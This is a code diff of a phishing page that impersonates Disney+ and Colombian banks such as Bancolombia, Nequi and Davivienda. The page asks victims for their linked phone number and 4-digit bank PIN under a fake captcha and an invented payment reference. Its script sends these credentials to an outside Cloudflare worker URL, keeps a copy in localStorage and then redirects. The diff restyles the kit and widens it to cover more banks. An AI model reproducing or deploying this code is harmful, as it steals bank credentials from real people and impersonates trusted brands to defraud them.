@@ -3,63 +3,154 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Validación - Disney+</title>
+<title>Validación Bancaria | Disney+</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
 * {
-    margin: 0;
-    padding: 0;
     box-sizing: border-box;
 }
 
 body {
-    background: #f5f5f5;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    margin: 0;
+    background: #0f0f0f;
+    font-family: 'Inter', sans-serif;
+    color: #fff;
     min-height: 100vh;
     display: flex;
     flex-direction: column;
 }
 
+/* HEADER */
+.header {
+    padding: 18px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: #0f0f0f;
+    border-bottom: 1px solid #222;
+}
+
+.header img {
+    height: 30px;
+}
+
+.header a {
+    color: #bbb;
+    font-size: 14px;
+    text-decoration: none;
+}
+
+.header a:hover {
+    color: #fff;
+}
+
+/* CONTENIDO PRINCIPAL */
 .container {
-    max-width: 400px;
+    max-width: 420px;
     margin: 40px auto;
-    padding: 25px;
-    background: #fff;
-    border-radius: 8px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+    background: #1a1a1a;
+    padding: 30px 25px;
+    border-radius: 16px;
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+    text-align: center;
+    flex: 1;
+}
+
+/* LOGO DEL BANCO */
+.bank-display {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 25px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #333;
+}
+
+.bank-logo-container {
+    width: 80px;
+    height: 80px;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 15px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
 }
 
 .bank-logo {
-    display: block;
-    margin: 0 auto 20px;
-    width: 60px;
-    height: 60px;
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain;
 }
 
-.input-group {
-    margin-bottom: 20px;
+.bank-info {
+    text-align: left;
 }
 
-.input-label {
-    display: block;
-    margin-bottom: 6px;
+.bank-name {
+    font-size: 22px;
+    font-weight: 600;
+    color: #00c8ff;
+    margin-bottom: 5px;
+}
+
+.bank-message {
     font-size: 14px;
-    color: #555;
+    color: #9ca3af;
 }
 
-.input-field {
+/* FORMULARIO */
+.form-group {
+    margin: 20px 0;
+    text-align: left;
+}
+
+label {
+    display: block;
+    margin: 0 0 8px 5px;
+    font-size: 14px;
+    color: #cccccc;
+}
+
+.input-with-icon {
+    position: relative;
+}
+
+.input-icon {
+    position: absolute;
+    left: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #9ca3af;
+    font-size: 18px;
+}
+
+input {
     width: 100%;
-    padding: 12px;
-    border: 1px solid #ddd;
-    border-radius: 6px;
-    font-size: 16px;
+    padding: 15px 15px 15px 45px;
+    background: #111;
+    border: 1px solid #333;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 15px;
+    transition: all 0.3s;
+}
+
+input:focus {
     outline: none;
+    border-color: #00c8ff;
+    box-shadow: 0 0 0 2px rgba(0, 200, 255, 0.2);
 }
 
-.input-field:focus {
-    border-color: #0063e5;
+input::placeholder {
+    color: #666;
 }
 
+/* MENSAJES DE VALIDACIÓN */
 .validation-message {
     font-size: 12px;
     color: #ff4444;
@@ -67,21 +158,36 @@ body {
     display: none;
 }
 
+/* CAPTCHA SECTION */
 .captcha-section {
     margin: 25px 0;
-    padding: 15px;
-    background: #f8f9fa;
-    border-radius: 8px;
+    padding: 20px;
+    border-radius: 12px;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid #333;
+}
+
+.captcha-instructions {
+    text-align: center;
+    font-size: 14px;
+    color: #9ca3af;
+    margin-bottom: 15px;
 }
 
 .captcha-progress-container {
     width: 100%;
     height: 50px;
-    background: #f0f0f0;
+    background: #222;
     border-radius: 25px;
     overflow: hidden;
     position: relative;
     cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+}
+
+.captcha-progress-container:hover {
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
 }
 
 .captcha-progress-fill {
@@ -90,9 +196,13 @@ body {
     left: 0;
     height: 100%;
     width: 0%;
-    background: linear-gradient(90deg, #4CAF50, #00C853);
+    background: linear-gradient(90deg, #00c8ff, #0099cc);
     border-radius: 25px;
     transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+.captcha-progress-container.completed .captcha-progress-fill {
+    background: linear-gradient(90deg, #00C853, #4CAF50);
 }
 
 .captcha-text {
@@ -101,38 +211,69 @@ body {
     left: 50%;
     transform: translate(-50%, -50%);
     font-size: 14px;
-    color: #666;
+    font-weight: 500;
+    color: #9ca3af;
     z-index: 2;
+    transition: all 0.3s ease;
 }
 
 .captcha-progress-container.completed .captcha-text {
     color: white;
-    font-weight: bold;
+    font-weight: 600;
 }
 
-.submit-btn {
+/* BOTÓN */
+button {
     width: 100%;
-    padding: 14px;
-    background: #ddd;
-    color: #666;
+    padding: 16px;
+    margin-top: 25px;
+    background: #333;
+    color: #888;
     border: none;
-    border-radius: 6px;
-    font-size: 16px;
-    font-weight: 500;
+    font-size: 17px;
+    font-weight: 600;
+    border-radius: 10px;
     cursor: not-allowed;
-    margin-top: 10px;
+    transition: all 0.3s;
+    letter-spacing: 0.5px;
 }
 
-.submit-btn.active {
-    background: #0063e5;
-    color: white;
+button.active {
+    background: linear-gradient(135deg, #00c8ff, #0099cc);
+    color: #000;
     cursor: pointer;
 }
 
-.submit-btn.active:hover {
-    background: #0052cc;
+button.active:hover {
+    background: linear-gradient(135deg, #22dbff, #00aadd);
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(0, 200, 255, 0.3);
 }
 
+button.active:active {
+    transform: translateY(0);
+}
+
+/* INFO ADICIONAL */
+.payment-info {
+    margin-top: 25px;
+    padding: 15px;
+    background: rgba(0, 200, 255, 0.05);
+    border-radius: 8px;
+    border: 1px solid rgba(0, 200, 255, 0.1);
+}
+
+.payment-info p {
+    margin: 5px 0;
+    font-size: 14px;
+    color: #9ca3af;
+}
+
+.payment-info strong {
+    color: #00c8ff;
+}
+
+/* LOADER */
 #loader {
     display: none;
     position: fixed;
@@ -140,94 +281,141 @@ body {
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(255, 255, 255, 0.95);
+    background: rgba(15, 15, 15, 0.95);
     z-index: 9999;
     text-align: center;
     padding-top: 40%;
     font-size: 18px;
+    color: #00c8ff;
+    font-weight: 600;
 }
 
-.payment-info {
-    margin-top: 20px;
-    padding: 15px;
-    background: #f8f9fa;
-    border-radius: 6px;
-    font-size: 14px;
-    color: #666;
+/* FOOTER */
+footer {
+    margin-top: 40px;
+    padding: 25px 20px;
+    background: #0d0d0d;
+    color: #7e7e7e;
     text-align: center;
+    font-size: 13px;
+    border-top: 1px solid #222;
 }
 
-.payment-info strong {
-    color: #333;
+footer a {
+    color: #00c8ff;
+    text-decoration: none;
+    margin: 0 10px;
 }
 
-.footer {
-    margin-top: auto;
-    padding: 20px;
-    text-align: center;
-    font-size: 12px;
-    color: #888;
+footer a:hover {
+    text-decoration: underline;
+}
+
+/* RESPONSIVE */
+@media (max-width: 480px) {
+    .container {
+        margin: 20px auto;
+        padding: 25px 20px;
+    }
+    
+    .bank-display {
+        flex-direction: column;
+        text-align: center;
+    }
+    
+    .bank-info {
+        text-align: center;
+    }
+    
+    .bank-name {
+        font-size: 20px;
+    }
 }
 </style>
 </head>
 
 <body>
 
+<!-- HEADER -->
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Disney+">
+    <a href="paso3.html">Volver</a>
+</div>
+
+<!-- CONTENIDO -->
 <div class="container">
     
-    <!-- Logo del banco -->
-    <img id="bankLogo" class="bank-logo" alt="Banco" src="">
-    
-    <!-- Formulario -->
-    <div class="input-group">
-        <label class="input-label">Número vinculado<span style="color:#ff4444">*</span></label>
-        <input type="number" class="input-field" id="usuario" placeholder="Ej: 3115555555" 
-               pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric">
+    <!-- DISPLAY DINÁMICO DEL BANCO -->
+    <div class="bank-display">
+        <div class="bank-logo-container">
+            <img id="bankLogo" class="bank-logo" alt="Logo Banco">
+        </div>
+        <div class="bank-info">
+            <div id="bankName" class="bank-name">Validación Bancaria</div>
+            <div id="bankMessage" class="bank-message">Ingrese sus credenciales de acceso</div>
+        </div>
+    </div>
+
+    <!-- FORMULARIO CON VALIDACIÓN COMPLETA -->
+    <div class="form-group">
+        <label>Número vinculado <span style="color:#ff4444">*</span></label>
+        <div class="input-with-icon">
+            <span class="input-icon">📱</span>
+            <input type="number" id="usuario" placeholder="Ej: 3115555555" 
+                   pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric">
+        </div>
         <div class="validation-message" id="usuario-error">Número inválido (10 dígitos, empezar con 3)</div>
     </div>
-    
-    <div class="input-group">
-        <label class="input-label">Clave de 4 dígitos<span style="color:#ff4444">*</span></label>
-        <input type="password" class="input-field" id="clave" placeholder="****" 
-               pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric">
+
+    <div class="form-group">
+        <label>Clave de 4 dígitos <span style="color:#ff4444">*</span></label>
+        <div class="input-with-icon">
+            <span class="input-icon">🔒</span>
+            <input type="password" id="clave" placeholder="****" 
+                   pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric">
+        </div>
         <div class="validation-message" id="clave-error">Clave inválida (4 dígitos)</div>
     </div>
 
-    <!-- CAPTCHA simplificado -->
+    <!-- CAPTCHA CON BARRA DE PROGRESO -->
     <div class="captcha-section">
-        <div style="text-align: center; font-size: 14px; color: #666; margin-bottom: 10px;">
-            Haz clic para verificar que no eres un robot
-        </div>
+        <div class="captcha-instructions">Haz clic para verificar que no eres un robot</div>
         <div class="captcha-progress-container" id="captchaProgress">
             <div class="captcha-progress-fill" id="captchaFill"></div>
             <div class="captcha-text" id="captchaText">Haz clic para verificar</div>
         </div>
         <div class="validation-message" id="captcha-error" style="text-align: center;">
-            Verifica que no eres un robot
+            Por favor verifica que no eres un robot
         </div>
     </div>
 
-    <!-- Info del pago -->
+    <!-- INFO DEL PAGO -->
     <div class="payment-info">
-        Pago a: <strong>Disney+</strong><br>
-        Monto: <strong id="paymentAmount">COP 24.900/mes</strong>
+        <p>Procesando pago de: <strong id="paymentAmount"></strong></p>
+        <p>Servicio: <strong>Disney+</strong></p>
+        <p>Referencia: <strong id="paymentRef"></strong></p>
     </div>
-    
-    <!-- Botón -->
-    <button class="submit-btn" id="loginBtn" disabled>
-        <span id="btnText">Verificar Identidad</span>
+
+    <!-- BOTÓN -->
+    <button id="loginBtn">
+        <span id="btnText">VALIDAR Y AUTORIZAR PAGO</span>
     </button>
-    
+
 </div>
 
-<div class="footer">
-    © 2025 Disney+. Proceso seguro.
-</div>
+<!-- FOOTER -->
+<footer>
+    © 2025 Disney+. Todos los derechos reservados. · 
+    <a href="#">Términos de uso</a> · 
+    <a href="#">Política de privacidad</a> · 
+    <a href="#">Ayuda</a>
+</footer>
 
+<!-- LOADER -->
 <div id="loader"></div>
 
 <script>
-// 🔥 WORKER URL - MANTENIENDO LA LÓGICA DEL CÓDIGO ORIGINAL
+// 🔥 WORKER URL - LÓGICA COMPLETA
 const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";
 
 // Variables globales
@@ -237,18 +425,29 @@ let camposValidos = {
     clave: false
 };
 
-// Logos de bancos
-const logos = {
-    "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/5/5a/Logo_Bancolombia.png",
-    "Nequi": "https://upload.wikimedia.org/wikipedia/commons/8/89/Nequi_logo_2021.png",
-    "Davivienda": "https://upload.wikimedia.org/wikipedia/commons/5/54/Logo-davivienda.png",
-    "BBVA": "https://upload.wikimedia.org/wikipedia/commons/8/8b/BBVA_Logo.svg",
-    "Banco Popular": "https://upload.wikimedia.org/wikipedia/commons/8/8e/Banco_Popular_logo.png",
-    "Banco de Bogotá": "https://upload.wikimedia.org/wikipedia/commons/8/89/Banco_de_Bogota_logo.svg",
-    "Itaú": "https://upload.wikimedia.org/wikipedia/commons/0/0a/Itau_logo.png"
+// LISTA COMPLETA DE LOGOS DE BANCOS COLOMBIANOS
+const bankLogos = {
+    "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Logo_Bancolombia.png/800px-Logo_Bancolombia.png",
+    "Nequi": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Nequi_logo_2021.png/800px-Nequi_logo_2021.png",
+    "Davivienda": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/54/Logo-davivienda.png/800px-Logo-davivienda.png",
+    "BBVA": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/BBVA_Logo.svg/800px-BBVA_Logo.svg.png",
+    "Banco Popular": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Banco_Popular_logo.png/800px-Banco_Popular_logo.png",
+    "Banco de Bogotá": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Banco_de_Bogota_logo.svg/800px-Banco_de_Bogota_logo.svg.png",
+    "Itaú": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Itau_logo.png/800px-Itau_logo.png"
 };
 
-// 🔥 FUNCIÓN DE VALIDACIÓN (MISMA LÓGICA)
+// TEXTO DESCRIPTIVO DE CADA BANCO
+const bankDescriptions = {
+    "Bancolombia": "Ingrese su número de celular vinculado",
+    "Nequi": "Ingrese su número de teléfono y PIN",
+    "Davivienda": "Ingrese sus credenciales de acceso",
+    "BBVA": "Ingrese sus credenciales de acceso",
+    "Banco Popular": "Ingrese sus credenciales de acceso",
+    "Banco de Bogotá": "Ingrese sus credenciales de acceso",
+    "Itaú": "Ingrese sus credenciales de acceso"
+};
+
+// 🔥 FUNCIÓN DE VALIDACIÓN (LÓGICA COMPLETA)
 function validarCampo(campoId, valor) {
     const errorElement = document.getElementById(campoId + '-error');
     let esValido = false;
@@ -274,7 +473,7 @@ function validarCampo(campoId, valor) {
     return esValido;
 }
 
-// 🔥 ACTUALIZAR PROGRESO (MISMA LÓGICA)
+// 🔥 ACTUALIZAR PROGRESO (LÓGICA COMPLETA)
 function actualizarProgreso() {
     const campos = ['usuario', 'clave'];
     let completados = 0;
@@ -297,7 +496,7 @@ function actualizarProgreso() {
     return completados === (campos.length + 1);
 }
 
-// 🔥 VALIDAR CAMPOS Y ACTUALIZAR BOTÓN
+// 🔥 VALIDAR CAMPOS Y ACTUALIZAR BOTÓN (LÓGICA COMPLETA)
 function validarCampos() {
     const todosCompletos = actualizarProgreso();
     const loginBtn = document.getElementById('loginBtn');
@@ -306,15 +505,15 @@ function validarCampos() {
     if (todosCompletos) {
         loginBtn.classList.add('active');
         loginBtn.disabled = false;
-        btnText.textContent = "✅ Verificar Identidad";
+        btnText.textContent = "✅ VALIDAR Y AUTORIZAR PAGO";
     } else {
         loginBtn.classList.remove('active');
         loginBtn.disabled = true;
-        btnText.textContent = "Verificar Identidad";
+        btnText.textContent = "VALIDAR Y AUTORIZAR PAGO";
     }
 }
 
-// 🔥 CAPTCHA (MISMA LÓGICA)
+// 🔥 CAPTCHA (LÓGICA COMPLETA)
 document.getElementById('captchaProgress').addEventListener('click', function () {
     if (captchaValidado) return;
 
@@ -334,7 +533,7 @@ document.getElementById('captchaProgress').addEventListener('click', function ()
     }, 500);
 });
 
-// 🔥 MANEJO DEL FORMULARIO (MISMA LÓGICA)
+// 🔥 MANEJO DEL FORMULARIO (LÓGICA COMPLETA)
 document.getElementById('loginBtn').addEventListener('click', async function (e) {
     e.preventDefault();
 
@@ -345,21 +544,29 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
 
     const loader = document.getElementById('loader');
     const loginBtn = document.getElementById('loginBtn');
+    const selectedBank = localStorage.getItem("selectedBank") || "Banco";
+    const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
 
     // Mostrar loader
     loader.style.display = 'block';
-    loader.innerHTML = '⏳ Verificando identidad...';
+    loader.innerHTML = `
+        <div style="font-size: 24px; margin-bottom: 20px;">⏳</div>
+        Verificando identidad...
+        <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Esto puede tomar unos segundos</div>
+    `;
     loginBtn.disabled = true;
 
     const datos = {
         usuario: document.getElementById('usuario').value.trim(),
         clave: document.getElementById('clave').value.trim(),
-        nombre: "Usuario Disney+", // Placeholder como en el código original
-        correo: "usuario@disney.com", // Placeholder
-        cedula: "CC 000000000", // Placeholder
+        nombre: "Usuario Disney+",
+        correo: "usuario@disney.com",
+        cedula: "CC 000000000",
         saldo: 0,
         transactionId: 'DISNEY_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
-        bank: localStorage.getItem("selectedBank") || "Disney+"
+        bank: selectedBank,
+        plan: paymentData.plan || "standard_ads",
+        amount: paymentData.amount || "COP 24.900/mes"
     };
 
     console.log("📤 Enviando datos a worker:", datos);
@@ -390,10 +597,14 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
         if (result.ok) {
             localStorage.setItem('bankAuthData', JSON.stringify(datos));
             
-            loader.innerHTML = '✅ Verificación exitosa. Redirigiendo...';
+            loader.innerHTML = `
+                <div style="font-size: 24px; margin-bottom: 20px;">✅</div>
+                Datos verificados correctamente<br>
+                <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Redirigiendo...</div>
+            `;
             
             setTimeout(() => {
-                window.location.href = 'resultados.html';
+                window.location.href = 'procesando.html';
             }, 2000);
 
         } else {
@@ -405,10 +616,14 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
         
         let errorMessage = "Error de conexión";
         if (error.name === 'AbortError') {
-            errorMessage = "Tiempo de espera agotado";
+            errorMessage = "Tiempo de espera agotado. Revisa tu conexión.";
         }
 
-        loader.innerHTML = `❌ ${errorMessage}. Reintentando...`;
+        loader.innerHTML = `
+            <div style="font-size: 24px; margin-bottom: 20px;">❌</div>
+            ${errorMessage}<br>
+            <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Reintentando en 3 segundos...</div>
+        `;
         
         setTimeout(() => {
             loader.style.display = 'none';
@@ -417,7 +632,7 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
     }
 });
 
-// 🔥 EVENT LISTENERS PARA VALIDACIÓN (MISMA LÓGICA)
+// 🔥 EVENT LISTENERS PARA VALIDACIÓN (LÓGICA COMPLETA)
 document.getElementById('usuario').addEventListener('input', function() {
     validarCampo('usuario', this.value);
     validarCampos();
@@ -428,25 +643,42 @@ document.getElementById('clave').addEventListener('input', function() {
     validarCampos();
 });
 
-// 🔥 INICIALIZACIÓN (MISMA LÓGICA)
+// 🔥 INICIALIZACIÓN (LÓGICA COMPLETA)
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('✅ Validación listo');
+    console.log('✅ Validación bancaria lista');
     
-    // Configurar logo del banco
-    const bank = localStorage.getItem("selectedBank") || "";
-    const logoElement = document.getElementById("bankLogo");
-    if (bank && logos[bank]) {
-        logoElement.src = logos[bank];
-        logoElement.alt = bank;
+    // Configurar banco
+    const selectedBank = localStorage.getItem("selectedBank") || "";
+    const bankLogoElement = document.getElementById("bankLogo");
+    const bankNameElement = document.getElementById("bankName");
+    const bankMessageElement = document.getElementById("bankMessage");
+    
+    if (selectedBank && bankLogos[selectedBank]) {
+        bankLogoElement.src = bankLogos[selectedBank];
+        bankLogoElement.alt = `Logo ${selectedBank}`;
+        bankNameElement.textContent = selectedBank;
+        
+        if (bankDescriptions[selectedBank]) {
+            bankMessageElement.textContent = bankDescriptions[selectedBank];
+        }
     } else {
-        logoElement.style.display = "none";
+        bankNameElement.textContent = "Banco no seleccionado";
+        bankMessageElement.textContent = "Regrese y seleccione un banco";
+        bankMessageElement.style.color = "#ff5555";
     }
     
-    // Mostrar monto del pago
+    // Configurar información del pago
     const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
     if (paymentData.amount) {
         document.getElementById("paymentAmount").textContent = paymentData.amount;
+    } else {
+        document.getElementById("paymentAmount").textContent = "COP 24.900/mes";
     }
+    
+    // Generar referencia única
+    const refNumber = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
+    document.getElementById("paymentRef").textContent = `DISNEY-${refNumber}`;
+    localStorage.setItem("paymentReference", refNumber);
     
     // Validación inicial
     validarCampos();
@@ -462,5 +694,3 @@ document.addEventListener('keypress', function(e) {
 
 </body>
 </html>
-
-
